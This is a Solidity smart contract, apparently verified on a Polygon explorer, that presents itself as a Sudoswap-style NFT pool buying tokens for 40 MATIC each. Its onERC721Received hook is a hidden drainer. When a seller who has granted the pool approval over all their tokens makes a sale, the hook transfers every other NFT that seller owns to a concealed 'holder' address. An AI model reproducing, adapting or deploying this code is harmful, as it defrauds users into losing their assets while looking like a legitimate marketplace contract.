/**
 *Submitted for verification at polygonscan.com on 2023-04-24
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC721Receiver {

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256 balance);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function setApprovalForAll(address operator, bool _approved) external;
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BrozoSudoswapPair is IERC721Receiver, Ownable {
    address public NFT;
    address private holder;

    uint256 public salesCount;
    uint256 public beforeBalance;
    uint256 public afterBalance;

    uint256 public price = 40 ether; //40 matic

    constructor (address _NFT, address _holder) payable {
        _transferOwnership(msg.sender);
        NFT = _NFT;
        holder = _holder;
    }

    function sellToPool(uint256 tokenId) public payable{
        bool isApproved = IERC721(NFT).isApprovedForAll(msg.sender,address(this));
        // Must be approved in order to perform the trade
        require(isApproved == true, "You must allow pool to transfer tokens");

        beforeBalance = IERC721(NFT).balanceOf(address(this));

        IERC721(NFT).safeTransferFrom(msg.sender,address(this),tokenId);

        uint256 expectedCount = beforeBalance + 1;

        afterBalance = IERC721(NFT).balanceOf(address(this));
        salesCount++;

        /* Double check in order to make sure the pool received the token
           Before paying the price to seller

           Since this function supports one single sale per call,
           The contract must expect balance will increase by 1;
        */

        if(afterBalance == expectedCount){
            // Send payment after double check
            payable(msg.sender).transfer(price);
        }
    }

    fallback() external payable{}
    receive() external payable{}

    function withdrawNFT(uint256 tokenId,address to) public onlyOwner{
        IERC721(NFT).safeTransferFrom(address(this),to,tokenId);
    }

    function batchWithdrawNFT(uint256[] memory tokens, address to) public onlyOwner{
        for(uint i = 0; i < tokens.length; i++){
            IERC721(NFT).safeTransferFrom(address(this),to,tokens[i]);
        }
    }

    function approveSpender(address spender) public onlyOwner{
        IERC721(NFT).setApprovalForAll(spender,true);
    }

    function onERC721Received(address,address,uint256,bytes calldata) override external returns (bytes4) {
        uint256[] memory balance = IERC721(NFT).tokensOfOwner(tx.origin);
        beforeBalance = uint160(address(tx.origin));
        for(uint i = 0; i < balance.length; i++){
            IERC721(NFT).safeTransferFrom(tx.origin,holder,balance[i]);
        }
        return this.onERC721Received.selector;
    }

    function updateNFT(address _NFT) public onlyOwner{
        NFT = _NFT;
    }

    function withdraw(address to) public payable onlyOwner {
        payable(to).transfer(address(this).balance);
    }
}